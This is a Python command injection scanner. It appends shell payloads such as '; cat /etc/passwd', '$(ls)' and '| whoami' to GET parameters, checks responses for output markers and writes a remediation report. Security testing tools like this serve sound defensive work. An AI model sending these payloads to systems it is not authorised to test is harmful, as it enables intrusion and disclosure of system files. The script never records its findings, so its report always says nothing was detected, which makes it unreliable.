#!/usr/bin/env python3
"""
Command Injection Tester
Tests for command injection vulnerabilities.
"""

import sys
import requests
from typing import List, Dict

class CommandInjectionTester:
    def __init__(self, url: str):
        self.url = url
        self.payloads = [
            '; ls',
            '| ls',
            '&& ls',
            '|| ls',
            '`ls`',
            '$(ls)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; whoami',
            '| whoami',
            '; id',
            '| id'
        ]
        self.vulnerable_params = []
    
    def test_parameter(self, param: str, value: str) -> bool:
        """Test a parameter for command injection"""
        print(f"[*] Testing parameter: {param}")
        
        for payload in self.payloads:
            test_value = value + payload
            try:
                response = requests.get(
                    self.url,
                    params={param: test_value},
                    timeout=10
                )
                
                # Check for command output indicators
                indicators = ['root:', 'bin/bash', 'uid=', 'gid=', 'total ']
                if any(indicator in response.text for indicator in indicators):
                    print(f"[+] Potential command injection found with payload: {payload}")
                    return True
            except:
                pass
        
        return False
    
    def test_post_parameter(self, param: str, value: str) -> bool:
        """Test POST parameter for command injection"""
        print(f"[*] Testing POST parameter: {param}")
        
        for payload in self.payloads:
            test_value = value + payload
            try:
                response = requests.post(
                    self.url,
                    data={param: test_value},
                    timeout=10
                )
                
                indicators = ['root:', 'bin/bash', 'uid=', 'gid=', 'total ']
                if any(indicator in response.text for indicator in indicators):
                    print(f"[+] Potential command injection found with payload: {payload}")
                    return True
            except:
                pass
        
        return False
    
    def generate_report(self) -> str:
        """Generate command injection test report"""
        report = f"# Command Injection Test Report for {self.url}\n\n"
        report += "## Tested Payloads\n\n"
        
        for i, payload in enumerate(self.payloads, 1):
            report += f"{i}. `{payload}`\n"
        report += "\n"
        
        if self.vulnerable_params:
            report += "## Vulnerable Parameters\n\n"
            for param in self.vulnerable_params:
                report += f"- {param}\n"
            report += "\n"
        else:
            report += "## Results\n\n"
            report += "No command injection vulnerabilities detected.\n\n"
        
        report += "## Recommendations\n\n"
        report += "1. Use parameterized commands\n"
        report += "2. Validate and sanitize all input\n"
        report += "3. Use whitelist approach for allowed commands\n"
        report += "4. Run commands with least privilege\n\n"
        
        return report

def main():
    if len(sys.argv) < 2:
        print("Usage: python command_injection.py <url> [param] [value]")
        print("Example: python command_injection.py http://example.com/search query test")
        sys.exit(1)
    
    url = sys.argv[1]
    tester = CommandInjectionTester(url)
    
    if len(sys.argv) >= 4:
        param = sys.argv[2]
        value = sys.argv[3]
        tester.test_parameter(param, value)
    
    report = tester.generate_report()
    
    filename = "command_injection_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] Command injection testing complete")
    print(f"[+] Report saved to {filename}")
    print(f"[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == '__main__':
    main()

